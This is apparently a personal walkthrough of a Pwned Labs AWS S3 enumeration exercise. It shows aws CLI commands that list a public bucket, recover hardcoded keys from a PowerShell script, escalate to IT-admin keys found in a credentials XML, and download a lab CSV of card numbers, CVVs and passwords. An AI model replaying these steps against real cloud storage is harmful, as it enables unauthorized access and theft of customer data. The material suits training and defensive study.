[https://pwnedlabs.io/labs/aws-s3-enumeration-basics](https://pwnedlabs.io/labs/aws-s3-enumeration-basics)
# S3 bucket:
```
dev.huge-logistics.com
```
![](https://beta.appflowy.cloud/api/file_storage/f097a39b-e398-43fe-9686-c99b9a15dd2a/v1/blob/2c93bede%2Dd7b7%2D43db%2D8082%2D23db25fe9d27/eUwy5hCxtu8_E3sGoSIAlN1UuwwZqE8xbLJHXl56bZ4=.png)
![](https://beta.appflowy.cloud/api/file_storage/f097a39b-e398-43fe-9686-c99b9a15dd2a/v1/blob/2c93bede%2Dd7b7%2D43db%2D8082%2D23db25fe9d27/RDKBwFtFjIhNMW81tRj4xAT-b63aykk6g8lzxNzMr-Y=.png)
## 1. list the S3 bucket
```
└─$ aws s3 ls s3://dev.huge-logistics.com/ --no-sign-request                                            
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 18:00:47       5347 index.html
                                                
                                                
 
 └─$ aws s3 ls s3://dev.huge-logistics.com/admin. --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
                                                                                                                                                                                            
]
└─$ aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
                                                                                                                                                                                            

└─$ aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
                                                                                                                                                                                            

└─$ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
2023-10-16 16:08:33          0 
2023-10-16 16:09:01        993 hl_migration_project.zip
                                                          
```
```
└─$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip

└─$ ls
hl_migration_project.zip
                                                                                                                                                                                            

└─$ unzip hl_migration_project.zip
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1     
                                                                                                                                                                                            

└─$ cat migrate_secrets.ps1
# AWS Configuration
$accessKey = "AKIA3S********U"
$secretKey = "MwGe3**************************9"
$region = "us-east-1"

# Set up AWS hardcoded credentials
Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

# Set the AWS region
Set-DefaultAWSRegion -Region $region

# Read the secrets from export.xml
[xml]$xmlContent = Get-Content -Path "export.xml"

# Output log file
$logFile = "upload_log.txt"

# Error handling with retry logic
function TryUploadSecret($secretName, $secretValue) {
    $retries = 3
    while ($retries -gt 0) {
        try {
            $result = New-SECSecret -Name $secretName -SecretString $secretValue
            $logEntry = "Successfully uploaded secret: $secretName with ARN: $($result.ARN)"
            Write-Output $logEntry
            Add-Content -Path $logFile -Value $logEntry
            return $true
        } catch {
            $retries--
            Write-Error "Failed attempt to upload secret: $secretName. Retries left: $retries. Error: $_"
        }
    }
    return $false
}

foreach ($secretNode in $xmlContent.Secrets.Secret) {
    # Implementing concurrency using jobs
    Start-Job -ScriptBlock {
        param($secretName, $secretValue)
        TryUploadSecret -secretName $secretName -secretValue $secretValue
    } -ArgumentList $secretNode.Name, $secretNode.Value
}

# Wait for all jobs to finish
$jobs = Get-Job
$jobs | Wait-Job

# Retrieve and display job results
$jobs | ForEach-Object {
    $result = Receive-Job -Job $_
    if (-not $result) {
        Write-Error "Failed to upload secret: $($_.Name) after multiple retries."
    }
    # Clean up the job
    Remove-Job -Job $_
}

Write-Output "Batch upload complete!"


# Install-Module -Name AWSPowerShell -Scope CurrentUser -Force
# .\migrate_secrets.ps1                  
```
## 2. config the credentials
```
$accessKey = "AKIA*************EHU"
$secretKey = "MwGe***************************9"
$region = "us-east-1"

```
```
└─$ aws sts get-caller-identity --profile s3                                                 
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}

```
## 3. back to S3 bucket
```
└─$ aws s3 ls s3://dev.huge-logistics.com/admin/ --profile s3                         
2023-10-16 16:08:38          0 
2024-12-02 14:57:44         32 flag.txt
2023-10-16 21:24:07       2425 website_transactions_export.csv



└─$ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile s3
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
                                                                                                                                                                                            

└─$ aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile s3
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden

```
Not allowed to download the files from the admin folder
```
└─$ aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile s3                 
2023-10-16 16:08:47          0 
2023-10-16 16:09:26    1833646 AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 16:09:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 16:09:27       1853 migrate_secrets.ps1
2023-10-16 19:00:13       2494 test-export.xml



└─$ aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile s3
download: s3://dev.huge-logistics.com/migration-files/test-export.xml to ./test-export.xml
                                                                                                                                                                                            

└─$ ls
hl_migration_project.zip  migrate_secrets.ps1  test-export.xml
                                                                                                                                                                                            

└─$ cat test-export.xml                  
<?xml version="1.0" encoding="UTF-8"?>
<CredentialsExport>
    <!-- Oracle Database Credentials -->
    <CredentialEntry>
        <ServiceType>Oracle Database</ServiceType>
        <Hostname>oracle-db-server02.prod.hl-internal.com</Hostname>
        <Username>admin</Username>
        <Password>Password123!</Password>
        <Notes>Primary Oracle database for the financial application. Ensure strong password policy.</Notes>
    </CredentialEntry>
    <!-- HP Server Credentials -->
    <CredentialEntry>
        <ServiceType>HP Server Cluster</ServiceType>
        <Hostname>hp-cluster1.prod.hl-internal.com</Hostname>
        <Username>root</Username>
        <Password>RootPassword456!</Password>
        <Notes>HP server cluster for batch jobs. Periodically rotate this password.</Notes>
    </CredentialEntry>
    <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AK***************CD</AccessKeyID>
        <SecretAccessKey>t2********************************jP</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
    <!-- Iron Mountain Backup Portal -->
    <CredentialEntry>
        <ServiceType>Iron Mountain Backup</ServiceType>
        <URL>https://backupportal.ironmountain.com</URL>
        <Username>hladmin</Username>
        <Password>HLPassword789!</Password>
        <Notes>Account used to schedule tape collections and deliveries. Schedule regular password rotations.</Notes>
    </CredentialEntry>
    <!-- Office 365 Admin Account -->
    <CredentialEntry>
        <ServiceType>Office 365</ServiceType>
        <URL>https://admin.microsoft.com</URL>
        <Username>admin@company.onmicrosoft.com</Username>
        <Password>O365Password321!</Password>
        <Notes>Office 365 global admin account. Use for essential administrative tasks only and enable MFA.</Notes>
    </CredentialEntry>
    <!-- Jira Admin Account -->
    <CredentialEntry>
        <ServiceType>Jira</ServiceType>
        <URL>https://hugelogistics.atlassian.net</URL>
        <Username>jira_admin</Username>
        <Password>JiraPassword654!</Password>
        <Notes>Jira administrative account. Restrict access and consider using API tokens where possible.</Notes>
    </CredentialEntry>

```
the pdf files cannot be downloaded, but the test-export file filled with some of the admin account credentials!!!
```
 <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA*************GCD</AccessKeyID>
        <SecretAccessKey>t21ERP****************************Y6jP</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
```
Found this aws acount keys for the it admin 
## 4. config the It admin account
```
─$ aws sts get-caller-identity --profile it                       
{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}

```
## 5. go back to the admin folder to see if I have the access to download the files
```
└─$ aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile it      
download: s3://dev.huge-logistics.com/admin/website_transactions_export.csv to ./website_transactions_export.csv
                                                                                                                                                                                            

└─$ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile it
download: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt
                                                                   
```
all been downloaded.
```
─$ cat website_transactions_export.csv
network,credit_card_number,cvv,expiry_date,card_holder_name,validation,username,password,ip_address
Visa,4055497191304,386,5/2021,Hunter Miller,,hunter_m,password123,34.56.78.90
Visa,4055491339081,492,8/2021,Jayden Adams,,jay_adams,jayden2023,157.89.34.56
Visa,4055491511051,244,10/2025,Jose Baker,,joseBaker24,jose@pass,212.45.67.89
Visa,4313504070320,984,3/2025,Gabriel Phillips,,gabrielP,welcome2025,58.67.34.23
Visa,4313504750869252,522,5/2024,Joseph Thomas,,joethomas,joe!pass,94.23.45.67
Visa,4313501801459893,585,5/2021,Chloe Nelson,,chloe_n,summer21,71.23.45.89
Visa,4313506927832,748,4/2025,Brianna Brown,,briBrown,ilovebri,102.178.23.45
Visa,4313508703687539,854,9/2021,Jose Perez,,jperez,jose*pass,145.89.23.67
Visa,4055490538100206,903,2/2022,Brooklyn Davis,,brookD,cookie22,89.45.23.56
Visa,4055496324021,989,10/2024,Elijah Davis,,elijahD2024,honey24,132.56.78.90
Visa,4313507611385,798,10/2025,Jose Davis,,josed_25,chocolate,193.45.67.80
Visa,4313505844566770,391,10/2023,Anna Miller,,annaM,anna2023,144.68.90.10
Visa,4313503045245021,319,9/2022,Anthony Collins,,tony_collins,tony!pass,154.23.67.89
Visa,4313503967294,839,7/2023,Alyssa Thompson,,alyssaT23,thompson23,212.67.89.90
Visa,4055496654879978,242,10/2023,Gabriel Garcia,,garcia_gabe,letmein,148.12.67.34
Visa,4313502893954,923,7/2025,Noah Allen,,noah_allen25,password2025,178.45.23.12
Visa,4055497065912,770,9/2021,Hunter Anderson,,hunterA2021,winter21,165.89.34.12
Visa,4055499869808,492,8/2025,David Jackson,,djackson,trustno1,194.56.78.90
Visa,4055493603013,993,3/2023,Katherine Anderson,,kat_anderson,love2023,204.89.23.45
Visa,4313507735369298,267,3/2021,Aiden Jones,,aidenJ,aiden@logistics,168.90.23.67
Visa,4055490830817,631,1/2023,Etha Nelson,,ethaN,etha@2023,132.78.90.10
Visa,4055492037879157,235,10/2024,Katherine Martin,,k_martin,superpass,178.89.23.45
Visa,4055490511326,802,3/2025,Elijah Scott,,elijahS2025,summer25,212.34.56.78
Visa,4313507927120,620,8/2022,Julia Brown,,juliaB22,julia@logis,189.23.45.67
Visa,4055498615148980,916,4/2024,Jose Jones,,j_jones24,jose2024,178.56.78.90
Visa,4313502314852,986,6/2024,Samantha Thompso,,samanthaT,samantha2024,167.89.90.12
Visa,4055491551140558,357,2/2023,Elizabeth Nelson,,lizNelson,princess23,204.56.78.12
Visa,4055496059868048,722,3/2025,Grace Brown,,graceB25,charlie1,156.78.90.12
Visa,4313508490261548,894,7/2025,Landon Adams,,landonA,landon@logis,146.78.90.23   
```
the bank accounts!!!

